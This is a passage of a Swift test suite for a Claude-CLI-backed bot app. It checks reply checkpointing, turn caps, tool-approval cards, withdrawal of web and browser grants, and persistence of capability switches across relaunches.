            "is_error": true, "num_turns": 16, "errors": ["Reached maximum number of turns (16)"],
            "modelUsage": [request.expectedResolvedModel: ["inputTokens": 10]], "permission_denials": []])
        return data
    }
}

/// A runner that plays canned CLI frames through the real stream parser, so
/// the service receives exactly the events the native transport would deliver
/// for them: the same snapshots, in the same order, and the same result.
private actor StreamReplayRunner: ClaudeTextOnlyRunning {
    private let frames: @Sendable (ClaudeTextOnlyRequest) throws -> Data
    init(frames: @escaping @Sendable (ClaudeTextOnlyRequest) throws -> Data) { self.frames = frames }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        var stream = ClaudeTextOnlyStream(request: request)
        var events: [ClaudeTextOnlyEvent] = []
        var rejection: ClaudeTextOnlyRejection?
        do { try stream.consume(frames(request)) { events.append($0) } }
        catch let failure as ClaudeTextOnlyRejection { rejection = failure }
        catch { return .failed(.invalidStream) }
        for event in events {
            // The transport reports the write of the input before the CLI
            // replays it; the parser only ever sees the replay.
            if case .inputAcknowledged = event { await onEvent(.inputSubmitted(messageID: request.messageID)) }
            await onEvent(event)
        }
        if let rejection {
            await onEvent(.diagnostic(rejection.code))
            return .failed(rejection.failure)
        }
        return stream.finish(exitCode: 0)
    }
}

private actor WebGrantProgressLog {
    private(set) var events: [ClaudeTextTurnProgress] = []
    func append(_ event: ClaudeTextTurnProgress) { events.append(event) }
    var confirmedAModel: Bool { events.contains { if case .modelConfirmed = $0 { true } else { false } } }
}

@Suite("A granted round trip is saved whole")
struct ClaudeTextReplyWebGrantRoundTripTests {
    @Test("What the model said before its tool call and after it is one saved reply, and the bot is free afterwards")
    func narrationAndAnswerAreSavedTogether() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        await access.setAppEnabled(true, capability: .web(.search))
        await access.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID)
        let runner = StreamReplayRunner { try WebGrantFrames.roundTrip($0) }
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        let log = WebGrantProgressLog()
        let result = await service.sendText(f.submission()) { await log.append($0) }
        #expect(result.outcome == .completed)
        let reply = try #require(result.savedReplyMessage)
        #expect(reply.deliveryState == .completed)
        #expect(reply.parts.first?.content == .text(WebGrantFrames.narration + "\n\n" + WebGrantFrames.answer))
        #expect(await log.confirmedAModel)
        // The run is closed, so the bot is not left busy for good.
        #expect(try await store.pendingTextTurns(appOwnerID: f.appOwner, limit: 10).isEmpty)
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
    }

    @Test("A run the CLI ends at its turn cap is its own failure, keeps what streamed, and frees the bot")
    func turnCapIsItsOwnProblem() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        await access.setAppEnabled(true, capability: .web(.search))
        await access.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID)
        let runner = StreamReplayRunner { try WebGrantFrames.turnCap($0) }
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        let result = await service.sendText(f.submission()) { _ in }
        #expect(result.outcome == .failed(.turnLimitReached))
        let reply = try #require(result.savedReplyMessage)
        #expect(reply.deliveryState == .failed)
        #expect(reply.parts.first?.content == .text(WebGrantFrames.narration))
        // The status saved beside the reply is the one a later reader sees, so
        // it names the cap rather than sending them after a provider fault.
        #expect(reply.parts.last?.content == .status("OpenBots diagnostic: turnLimitReached"))
        #expect(try await store.pendingTextTurns(appOwnerID: f.appOwner, limit: 10).isEmpty)
    }
}

// MARK: - A turn longer than one lease

/// A clock the test moves by hand, so a turn can span more wall time than one
/// lease without anyone waiting for it.
private final class WebGrantClock: OpenBotsClock, @unchecked Sendable {
    private let lock = NSLock()
    private var instant: TimeInterval = 4_100
    func now() -> Date { lock.withLock { Date(timeIntervalSince1970: instant) } }
    func advance(by seconds: TimeInterval) { lock.withLock { instant += seconds } }
}

/// Each snapshot lands 170 seconds after the last; three of them span nearly
/// three times the 180-second lease a turn begins with.
private actor LongReplyRunner: ClaudeTextOnlyRunning {
    private let clock: WebGrantClock
    init(clock: WebGrantClock) { self.clock = clock }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        var text = ""
        for piece in ["First part. ", "Second part. ", "Third part."] {
            clock.advance(by: 170)
            text += piece
            await onEvent(.textSnapshot(text))
        }
        return .success(ClaudeTextOnlyReply(sessionID: request.sessionID,
            actualModel: request.expectedResolvedModel, text: text, confirmedActualModel: request.expectedResolvedModel))
    }
}

@Suite("A long text turn outlives the lease it began with")
struct ClaudeTextReplyLeaseTests {
    @Test("A reply whose checkpoints span more than one lease is still saved whole")
    func checkpointsCarryTheLease() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let clock = WebGrantClock()
        let service = f.service(store, runner: LongReplyRunner(clock: clock), access: nil,
            target: try f.target(), clock: clock)
        let result = await service.sendText(f.submission()) { _ in }
        #expect(result.outcome == .completed)
        #expect(result.savedReplyMessage?.parts.first?.content == .text("First part. Second part. Third part."))
        #expect(result.savedReplyMessage?.deliveryState == .completed)
        #expect(try await store.pendingTextTurns(appOwnerID: f.appOwner, limit: 10).isEmpty)
    }
}

// MARK: - A streaming reply written at a human pace

/// The real store behind a counter: every write goes through to SQLite, and
/// the text each checkpoint carried is kept in order, so a test can say how
/// often a stream reached the disk and what was on the record at a given moment.
private actor CountingTextTurnStore: TextTurnRepository, ClaudeExecutionEvidenceRepository {
    private let store: SQLiteStore
    private(set) var checkpoints: [String] = []
    init(_ store: SQLiteStore) { self.store = store }

    /// The checkpoints a text snapshot caused; the two input-evidence writes
    /// carry no text yet.
    var textCheckpoints: [String] { checkpoints.filter { !$0.isEmpty } }

    func beginTextTurn(request: WorkRequest, userMessage: Message, expectedPreviousSequence: Int64,
                       ownerID: UUID, token: UUID, now: Date, leaseDuration: TimeInterval) async throws -> TextTurnSnapshot {
        try await store.beginTextTurn(request: request, userMessage: userMessage,
            expectedPreviousSequence: expectedPreviousSequence, ownerID: ownerID, token: token,
            now: now, leaseDuration: leaseDuration)
    }

    func checkpointTextTurn(id: RunID, expectedRevision: Int64, token: UUID, text: String,
                            inputEvidence: TextTurnInputEvidence, now: Date) async throws -> TextTurnSnapshot {
        checkpoints.append(text)
        return try await store.checkpointTextTurn(id: id, expectedRevision: expectedRevision, token: token,
            text: text, inputEvidence: inputEvidence, now: now)
    }

    func finishTextTurn(id: RunID, expectedRevision: Int64, token: UUID, text: String,
                        outcome: TextTurnOutcome, diagnosticCode: TextTurnDiagnosticCode?,
                        now: Date) async throws -> TextTurnSnapshot {
        try await store.finishTextTurn(id: id, expectedRevision: expectedRevision, token: token,
            text: text, outcome: outcome, diagnosticCode: diagnosticCode, now: now)
    }

    func latestTextTurn(conversationID: ConversationID, teammateID: TeammateID) async throws -> TextTurnSnapshot? {
        try await store.latestTextTurn(conversationID: conversationID, teammateID: teammateID)
    }

    func pendingTextTurns(appOwnerID: UUID, limit: Int) async throws -> [TextTurnSnapshot] {
        try await store.pendingTextTurns(appOwnerID: appOwnerID, limit: limit)
    }

    func interruptTextTurn(id: RunID, expectedRevision: Int64, appOwnerID: UUID,
                           processAbsence: TextTurnProcessAbsence, now: Date) async throws -> TextTurnSnapshot {
        try await store.interruptTextTurn(id: id, expectedRevision: expectedRevision, appOwnerID: appOwnerID,
            processAbsence: processAbsence, now: now)
    }

    func textTurnProvenance(conversationID: ConversationID,
                            messageIDs: [MessageID]) async throws -> [TextTurnMessageProvenance] {
        try await store.textTurnProvenance(conversationID: conversationID, messageIDs: messageIDs)
    }

    func recordTextTurnExecutionEvidence(id: RunID, expectedRevision: Int64, token: UUID,
                                         evidence: ClaudeExecutionEvidence, now: Date) async throws -> TextTurnSnapshot {
        try await store.recordTextTurnExecutionEvidence(id: id, expectedRevision: expectedRevision, token: token,
            evidence: evidence, now: now)
    }

    func finishTextTurnWithExecutionEvidence(id: RunID, expectedRevision: Int64, token: UUID,
                                             text: String, outcome: TextTurnOutcome, diagnosticCode: TextTurnDiagnosticCode?,
                                             evidence: ClaudeExecutionEvidence, now: Date) async throws -> TextTurnSnapshot {
        try await store.finishTextTurnWithExecutionEvidence(id: id, expectedRevision: expectedRevision, token: token,
            text: text, outcome: outcome, diagnosticCode: diagnosticCode, evidence: evidence, now: now)
    }

    func textTurnExecutionEvidence(id: RunID) async throws -> ClaudeExecutionEvidence? {
        try await store.textTurnExecutionEvidence(id: id)
    }

    func latestTextTurnExecutionEvidence(conversationID: ConversationID) async throws -> ClaudeExecutionEvidence? {
        try await store.latestTextTurnExecutionEvidence(conversationID: conversationID)
    }
}

/// A fast reply as the transport delivers it: fifty snapshots twenty
/// milliseconds apart, each one word longer than the last, one second of
/// streaming in all. The child then finishes with the whole text, or dies with
/// its last words already delivered.
private actor FastReplyRunner: ClaudeTextOnlyRunning {
    enum Ending { case finishes, dies }
    static let words = 50
    static func text(upTo count: Int) -> String { (1...count).map { "word\($0)" }.joined(separator: " ") }
    static var wholeText: String { text(upTo: words) }
    private let clock: WebGrantClock
    private let ending: Ending
    init(clock: WebGrantClock, ending: Ending) { self.clock = clock; self.ending = ending }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        for count in 1...Self.words {
            clock.advance(by: 0.02)
            await onEvent(.textSnapshot(Self.text(upTo: count)))
        }
        switch ending {
        case .finishes:
            return .success(ClaudeTextOnlyReply(sessionID: request.sessionID,
                actualModel: request.expectedResolvedModel, text: Self.wholeText,
                confirmedActualModel: request.expectedResolvedModel))
        case .dies:
            await onEvent(.diagnostic(.providerFailure))
            return .failed(.providerFailed)
        }
    }
}

/// A bot without Work, given reading only.
private struct WebGrantReadAccess: ClaudeTextReplyWebAccessResolving {
    let read: ClaudeTextReadAccess
    let work: ClaudeTextWorkAccess?
    func allowedTextReplyTools(teammateID: TeammateID) async -> Set<ClaudeTextOnlyTool> { [] }
    func webAccessChanges() async -> AsyncStream<Void> { AsyncStream { $0.finish() } }
    func workAccess(teammateID: TeammateID) async -> ClaudeTextWorkAccess? { work }
    func readAccess(teammateID: TeammateID) async -> ClaudeTextReadAccess? { read }
}

/// A bot with a browser and, when given, reading: a turn that carries the question channel.
private struct ReadingBrowserAccess: ClaudeTextReplyWebAccessResolving {
    static let serverName = "openbots_" + String(repeating: "5d1c", count: 16)
    let read: ClaudeTextReadAccess?
    func allowedTextReplyTools(teammateID: TeammateID) async -> Set<ClaudeTextOnlyTool> { [] }
    func webAccessChanges() async -> AsyncStream<Void> { AsyncStream { $0.finish() } }
    func readAccess(teammateID: TeammateID) async -> ClaudeTextReadAccess? { read }
    func grantedConnectorNames(teammateID: TeammateID) async -> Set<String> { [Self.serverName] }
    func connectorAccess(teammateID: TeammateID, runID: UUID) async -> ClaudeTextConnectorAccess? {
        try? ClaudeTextConnectorAccess(servers: [
            try ClaudeTextConnectorServer(name: Self.serverName, role: .browser,
                executableURL: URL(fileURLWithPath: "/opt/homebrew/bin/node"),
                entryPointURL: URL(fileURLWithPath: "/private/tmp/cache.noindex/chrome-devtools-mcp.js"),
                options: [.headless, .userDataDirectory(URL(fileURLWithPath: "/private/tmp/openbots-browser.noindex/\(runID.uuidString.lowercased())")),
                          .executablePath(URL(fileURLWithPath: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"))],
                environment: ["CHROME_DEVTOOLS_MCP_NO_USAGE_STATISTICS": "1"])
        ])
    }
}

/// The CLI asking the host about one built-in read, and the sentence the host denies it with.
private actor ReadQuestionRunner: ClaudeTextOnlyRunning {
    let toolName: String
    private(set) var requests: [ClaudeTextOnlyRequest] = []
    private(set) var denial: String?
    init(toolName: String) { self.toolName = toolName }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        await run(request: request, control: nil, onEvent: onEvent)
    }

    func run(request: ClaudeTextOnlyRequest, control: ClaudeTextTurnControl?,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        requests.append(request)
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        let input = try! JSONSerialization.data(withJSONObject: ["file_path": "/Users/x/Documents/notes.md", "pattern": "notes"])
        await onEvent(.toolUse(ClaudeTextToolUse(id: "toolu_01", toolName: toolName, inputJSON: input)))
        let asked = ClaudeTextPermissionRequest(requestID: "req_01", toolUseID: "toolu_01", toolName: toolName, inputJSON: input)
        control?.register(asked)
        await onEvent(.permissionRequested(asked))
        if let control {
            for _ in 0..<800 {
                let pending = control.takePending()
                if let frame = pending.first, let object = try? JSONSerialization.jsonObject(with: frame) as? [String: Any] {
                    denial = ((object["response"] as? [String: Any])?["response"] as? [String: Any])?["message"] as? String
                    break
                }
                try? await Task.sleep(for: .milliseconds(10))
            }
        }
        await onEvent(.toolFinished(toolUseID: "toolu_01", failed: true))
        await onEvent(.textSnapshot("Done."))
        return .success(ClaudeTextOnlyReply(sessionID: request.sessionID, actualModel: request.expectedResolvedModel,
            text: "Done.", confirmedActualModel: request.expectedResolvedModel))
    }
}

/// A bot granted its own folder and nothing else.
private struct WebGrantWorkAccess: ClaudeTextReplyWebAccessResolving {
    let access: ClaudeTextWorkAccess
    func allowedTextReplyTools(teammateID: TeammateID) async -> Set<ClaudeTextOnlyTool> { [] }
    func webAccessChanges() async -> AsyncStream<Void> { AsyncStream { $0.finish() } }
    func workAccess(teammateID: TeammateID) async -> ClaudeTextWorkAccess? { access }
}

/// What the record said at one moment: every checkpoint written so far, and
/// the reply text a relaunch would find on the pending turn.
private struct RecordReading: Equatable, Sendable {
    let written: [String]
    let onRecord: String?
}

private func recordReader(_ counting: CountingTextTurnStore, _ store: SQLiteStore,
                          appOwner: UUID) -> @Sendable () async -> RecordReading {
    return {
        RecordReading(written: await counting.textCheckpoints,
            onRecord: try? await store.pendingTextTurns(appOwnerID: appOwner, limit: 10).first?.replyText)
    }
}

/// A granted turn as the CLI runs one: a sentence, a few more words twenty
/// milliseconds later (held back by the throttle), then the bot pauses. The
/// service writes a held snapshot at two sites, and each is driven here on
/// its own, so dropping either flush alone goes red:
///
/// - `.announcedCall`: the CLI announces a tool call and never asks, as a
///   read inside the bot's own folder runs. On the real wire the parser
///   emits `.toolUse` from the complete assistant frame before any
///   `control_request`, so this is the flush that fires on every call.
/// - `.unannouncedCard`: a question reaches the service with no `.toolUse`
///   before it, so only the card's own flush can write the held words.
///
/// Either way the runner reads the record the moment the pause begins, as a
/// relaunch right then would find it, and waits for the answer the way the
/// real transport does.
private actor HeldSnapshotRunner: ClaudeTextOnlyRunning {
    enum Pause { case announcedCall, unannouncedCard }
    static let firstWords = "Let me tidy that folder."
    static let lastWords = "Let me tidy that folder. Moving a.txt out of the way now."
    private let clock: WebGrantClock
    private let pause: Pause
    private let inputJSON: Data
    private let readRecord: @Sendable () async -> RecordReading
    private(set) var atPause: RecordReading?

    init(clock: WebGrantClock, pause: Pause, inputJSON: Data,
         readRecord: @escaping @Sendable () async -> RecordReading) {
        self.clock = clock; self.pause = pause; self.inputJSON = inputJSON; self.readRecord = readRecord
    }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        await run(request: request, control: nil, onEvent: onEvent)
    }

    func run(request: ClaudeTextOnlyRequest, control: ClaudeTextTurnControl?,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        clock.advance(by: 0.02)
        await onEvent(.textSnapshot(Self.firstWords))
        clock.advance(by: 0.02)
        await onEvent(.textSnapshot(Self.lastWords))
        var failed = false
        switch pause {
        case .announcedCall:
            await onEvent(.toolUse(ClaudeTextToolUse(id: "toolu_01", toolName: "Read", inputJSON: inputJSON)))
            atPause = await readRecord()
        case .unannouncedCard:
            let asked = ClaudeTextPermissionRequest(requestID: "req_01", toolUseID: "toolu_01", toolName: "Bash", inputJSON: inputJSON)
            control?.register(asked)
            await onEvent(.permissionRequested(asked))
            atPause = await readRecord()
            var allowed = false
            if let control {
                for _ in 0..<800 {
                    let pending = control.takePending()
                    if !pending.isEmpty {
                        allowed = pending.contains { String(decoding: $0, as: UTF8.self).contains("\"behavior\":\"allow\"") }
                        break
                    }
                    try? await Task.sleep(for: .milliseconds(10))
                }
            }
            failed = !allowed
        }
        await onEvent(.toolFinished(toolUseID: "toolu_01", failed: failed))
        return .success(ClaudeTextOnlyReply(sessionID: request.sessionID,
            actualModel: request.expectedResolvedModel, text: Self.lastWords,
            confirmedActualModel: request.expectedResolvedModel))
    }
}

private struct CardNeverShown: Error {}

/// The card as the screen received it.
private actor CardLog {
    private(set) var card: ClaudeTextApproval?
    func cardShown(_ card: ClaudeTextApproval) { self.card = card }
    func waitForCard() async throws -> ClaudeTextApproval {
        for _ in 0..<800 {
            if let card { return card }
            try await Task.sleep(for: .milliseconds(10))
        }
        throw CardNeverShown()
    }
}

@Suite("A streaming reply reaches the disk at a human pace")
struct ClaudeTextReplyCheckpointPaceTests {
    @Test("A snapshot the throttle held back is on the record the moment a tool call is announced")
    func heldSnapshotIsWrittenWhenAToolCallIsAnnounced() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let counting = CountingTextTurnStore(store)
        let clock = WebGrantClock()
        let folder = f.directory.appendingPathComponent("Bots/Yogurt")
        let read = try JSONSerialization.data(withJSONObject: ["file_path": folder.appendingPathComponent("notes.txt").path],
            options: [.sortedKeys])
        let access = try ClaudeTextWorkAccess(workingDirectoryURL: folder, protectedPaths: [])
        let runner = HeldSnapshotRunner(clock: clock, pause: .announcedCall, inputJSON: read,
            readRecord: recordReader(counting, store, appOwner: f.appOwner))
        let service = f.service(store, runner: runner, access: WebGrantWorkAccess(access: access),
            target: try f.target(), clock: clock, repository: counting)
        let result = await service.sendText(f.submission()) { _ in }
        #expect(result.outcome == .completed)
        // The second snapshot came 20 ms after the first: held, then written
        // when the call was announced, before it ran. A quiet call can take
        // minutes; if the app quit meanwhile, this is what the person would find.
        let announced = try #require(await runner.atPause)
        #expect(announced.onRecord == HeldSnapshotRunner.lastWords, "on the record at the call: \(announced.onRecord ?? "(nothing)")")
        #expect(announced.written == [HeldSnapshotRunner.firstWords, HeldSnapshotRunner.lastWords], "\(announced.written)")
        #expect(result.savedReplyMessage?.parts.first?.content == .text(HeldSnapshotRunner.lastWords))
        #expect(try await store.pendingTextTurns(appOwnerID: f.appOwner, limit: 10).isEmpty)
    }

    @Test("A snapshot the throttle held back is on the record before a card that arrives unannounced")
    func heldSnapshotIsWrittenBeforeAnUnannouncedCard() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let counting = CountingTextTurnStore(store)
        let clock = WebGrantClock()
        let command = try JSONSerialization.data(withJSONObject: ["command": "mv a.txt b.txt"], options: [.sortedKeys])
        let access = try ClaudeTextWorkAccess(workingDirectoryURL: f.directory.appendingPathComponent("Bots/Yogurt"),
            protectedPaths: [])
        let runner = HeldSnapshotRunner(clock: clock, pause: .unannouncedCard, inputJSON: command,
            readRecord: recordReader(counting, store, appOwner: f.appOwner))
        let service = f.service(store, runner: runner, access: WebGrantWorkAccess(access: access),
            target: try f.target(), clock: clock, repository: counting)
        let log = CardLog()
        let turn = Task {
            await service.sendText(f.submission()) { progress in
                guard case .approvalRequired(let card) = progress else { return }
                await log.cardShown(card)
            }
        }
        let card = try await log.waitForCard()
        #expect(card.toolName == "Bash")
        #expect(await service.decideApproval(id: card.id, allow: true))
        let result = await turn.value
        #expect(result.outcome == .completed)
        // What the record said while the card waited, read by the runner the
        // moment the card went up: if the app quit there, this is the reply
        // the person would find.
        let atCard = try #require(await runner.atPause)
        #expect(atCard.onRecord == HeldSnapshotRunner.lastWords, "on the record at the card: \(atCard.onRecord ?? "(nothing)")")
        #expect(atCard.written == [HeldSnapshotRunner.firstWords, HeldSnapshotRunner.lastWords], "\(atCard.written)")
        #expect(result.savedReplyMessage?.parts.first?.content == .text(HeldSnapshotRunner.lastWords))
        #expect(try await store.pendingTextTurns(appOwnerID: f.appOwner, limit: 10).isEmpty)
    }

    @Test("Fifty snapshots in one second are written a handful of times, and the whole reply is saved")
    func midStreamSnapshotsAreThrottledAndTheLastOneAlwaysLands() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let counting = CountingTextTurnStore(store)
        let clock = WebGrantClock()
        let service = f.service(store, runner: FastReplyRunner(clock: clock, ending: .finishes), access: nil,
            target: try f.target(), clock: clock, repository: counting)
        let result = await service.sendText(f.submission()) { _ in }
        #expect(result.outcome == .completed)
        // Every checkpoint is an fsynced transaction; a fast reply used to pay
        // one per delivered snapshot, about a hundred a second.
        let written = await counting.textCheckpoints
        #expect(written.count <= 5, "fifty snapshots in one second reached the disk \(written.count) times")
        #expect(written.count >= 2, "the reply still reaches the disk while it streams")
        // Each write carried the text as it stood, and the reply is saved whole.
        for text in written { #expect(FastReplyRunner.wholeText.hasPrefix(text)) }
        #expect(result.savedReplyMessage?.parts.first?.content == .text(FastReplyRunner.wholeText))
        #expect(result.savedReplyMessage?.deliveryState == .completed)
        #expect(try await store.pendingTextTurns(appOwnerID: f.appOwner, limit: 10).isEmpty)
    }

    @Test("A child that dies right after a snapshot the throttle held back still leaves its last words saved")
    func lastWordsSurviveAChildThatDies() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let counting = CountingTextTurnStore(store)
        let clock = WebGrantClock()
        let service = f.service(store, runner: FastReplyRunner(clock: clock, ending: .dies), access: nil,
            target: try f.target(), clock: clock, repository: counting)
        let result = await service.sendText(f.submission()) { _ in }
        #expect(result.outcome == .failed(.runtimeUnavailable))
        // The last snapshot came 180 ms after the previous write, so it was
        // still in memory when the child died; the failed reply carries it anyway.
        #expect(await counting.textCheckpoints.last != FastReplyRunner.wholeText,
                "the fiftieth snapshot was written on its own, so nothing was held back")
        #expect(result.savedReplyMessage?.parts.first?.content == .text(FastReplyRunner.wholeText))
        #expect(result.savedReplyMessage?.deliveryState == .failed)
        #expect(try await store.pendingTextTurns(appOwnerID: f.appOwner, limit: 10).isEmpty)
    }
}

// MARK: - A withdrawal that arrives too late to stop anything

/// A runner whose child finishes on its own and only then sees the switch
/// move: it flips the grant, waits for the cancellation the watcher sends, and
/// returns the complete reply the transport had already fixed.
private actor FinishedBeforeWithdrawalRunner: ClaudeTextOnlyRunning {
    private let access: AgenticJobAccessStore
    private(set) var sawCancellation = false
    init(access: AgenticJobAccessStore) { self.access = access }

    func run(request: ClaudeTextOnlyRequest,
             onEvent: @escaping @Sendable (ClaudeTextOnlyEvent) async -> Void) async -> ClaudeTextOnlyResult {
        await onEvent(.initialized(sessionID: request.sessionID, actualModel: request.expectedResolvedModel))
        await onEvent(.inputSubmitted(messageID: request.messageID))
        await onEvent(.inputAcknowledged(messageID: request.messageID))
        await onEvent(.textSnapshot("Complete reply."))
        // The child has finished. Now the user turns the switch off, and the
        // withdrawal reaches the service before this result does.
        await access.setAppEnabled(false, capability: .web(.search))
        for _ in 0..<150 where !Task.isCancelled { try? await Task.sleep(for: .milliseconds(20)) }
        sawCancellation = Task.isCancelled
        return .success(ClaudeTextOnlyReply(sessionID: request.sessionID,
            actualModel: request.expectedResolvedModel, text: "Complete reply.",
            confirmedActualModel: request.expectedResolvedModel))
    }
}

@Suite("A withdrawal that lands after the reply is complete")
struct ClaudeTextReplyLateWithdrawalTests {
    @Test("A switch turned off after the child has finished does not relabel the complete reply as interrupted")
    func lateWithdrawalLeavesACompleteReplyComplete() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = AgenticJobAccessStore()
        await access.setAppEnabled(true, capability: .web(.search))
        await access.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID)
        let runner = FinishedBeforeWithdrawalRunner(access: access)
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        let log = WebGrantProgressLog()
        let result = await service.sendText(f.submission()) { await log.append($0) }
        // The withdrawal did reach the turn; it simply had nothing left to stop.
        #expect(await runner.sawCancellation)
        #expect(result.outcome == .completed)
        #expect(result.savedReplyMessage?.deliveryState == .completed)
        #expect(result.savedReplyMessage?.parts.first?.content == .text("Complete reply."))
        #expect(await log.confirmedAModel)
    }
}

// MARK: - Switches that survived a relaunch

/// The web switches survive a relaunch. When they lived in memory alone,
/// every reinstall turned them off. A store restored
/// from a database where both switches are on must grant the tools to a turn
/// nobody touched a switch for, and the restored grant must be a live one:
/// withdrawing it stops the turn, and the withdrawal is what the next launch sees.
@Suite("Web switches that survived a relaunch")
struct ClaudeTextReplyWebGrantRelaunchTests {
    @Test("A store restored from a database where both switches are on grants both tools with no user action")
    func restoredSwitchesGrantTheTurn() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        weak var closed: SQLiteStore?
        do {
            // The previous launch: the user turned both switches on for this bot,
            // then quit.
            let store = try f.open(); closed = store
            try await f.seed(store)
            let earlier = AgenticJobAccessStore()
            await earlier.restore(from: store)
            for capability in [AgenticCapability.web(.search), .web(.fetch)] {
                await earlier.setAppEnabled(true, capability: capability)
                await earlier.setBotEnabled(true, capability: capability, teammateID: f.teammateID)
            }
            await earlier.waitForPendingWrites()
        }
        try await relaunchWait { closed == nil }
        #expect(closed == nil, "the database of the previous launch really closed")
        // This launch: a fresh store, restored before the service reads it.
        let reopened = try f.open()
        let access = AgenticJobAccessStore()
        await access.restore(from: reopened)
        let runner = WebGrantRunner()
        let service = f.service(reopened, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.allowedTools == [.webSearch, .webFetch])
        #expect(request.systemPrompt.contains("WebSearch, to search the public web"))
        #expect(request.systemPrompt.contains("WebFetch, to read a public web page you name"))
        let arguments = ClaudeTextOnlyCommandBuilder.arguments(for: request)
        #expect(arguments.firstIndex(of: "--tools").map { arguments[$0 + 1] } == "WebSearch,WebFetch")
    }

    @Test("A restored grant is a live grant: the app-wide switch turned off stops the turn using it, and the next launch sees it off")
    func restoredGrantIsWithdrawnLikeALiveOne() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        weak var closed: SQLiteStore?
        do {
            let store = try f.open(); closed = store
            try await f.seed(store)
            let earlier = AgenticJobAccessStore()
            await earlier.restore(from: store)
            await earlier.setAppEnabled(true, capability: .web(.search))
            await earlier.setBotEnabled(true, capability: .web(.search), teammateID: f.teammateID)
            await earlier.waitForPendingWrites()
        }
        try await relaunchWait { closed == nil }
        #expect(closed == nil)
        do {
            let reopened = try f.open(); closed = reopened
            let access = AgenticJobAccessStore()
            await access.restore(from: reopened)
            let runner = HeldWebGrantRunner()
            let service = f.service(reopened, runner: runner, access: access, target: try f.target())
            async let outcome = service.sendText(f.submission()) { _ in }.outcome
            await runner.waitUntilRunning()
            await access.setAppEnabled(false, capability: .web(.search))
            #expect(await outcome == .stopped)
            #expect(await runner.wasCancelled)
            #expect(await runner.requests.first?.allowedTools == [.webSearch])
            await access.waitForPendingWrites()
        }
        try await relaunchWait { closed == nil }
        #expect(closed == nil)
        // The next launch: the withdrawal the user made is what comes back; the
        // bot's own grant is still there.
        let third = try f.open()
        let access = AgenticJobAccessStore()
        await access.restore(from: third)
        let current = await access.current(teammateID: f.teammateID)
        #expect(!current.webSearch.appEnabled && current.webSearch.botEnabled)
        #expect(current.grantedWebCapabilities.isEmpty)
    }
}

/// A closed store is released when its last owner lets go; a service's turn
/// tasks let go a moment after the turn returns. Bounded, so a leak fails the
/// assertion after it rather than hanging the suite.
private func relaunchWait(_ released: () -> Bool) async throws {
    for _ in 0..<100 where !released() { try await Task.sleep(for: .milliseconds(10)) }
}

// MARK: - The browser grant, on the same seam as the web switches

/// A resolver that grants a browser and nothing else, so these tests prove the
/// browser reaches a turn on its own — with files, shell and web all switched
/// off — which is the point of it being a separate switch.
private actor BrowserGrantAccess: ClaudeTextReplyWebAccessResolving {
    private var granted: Set<TeammateID>
    private var observers: [UUID: AsyncStream<Void>.Continuation] = [:]
    static let serverName = "openbots_" + String(repeating: "9f3a2b01", count: 8)

    init(granted: Set<TeammateID>) { self.granted = granted }

    func allowedTextReplyTools(teammateID: TeammateID) async -> Set<ClaudeTextOnlyTool> { [] }
    func webAccessChanges() async -> AsyncStream<Void> {
        AsyncStream(bufferingPolicy: .bufferingNewest(1)) { continuation in
            let id = UUID()
            observers[id] = continuation
            continuation.onTermination = { _ in Task { await self.forget(id) } }
        }
    }
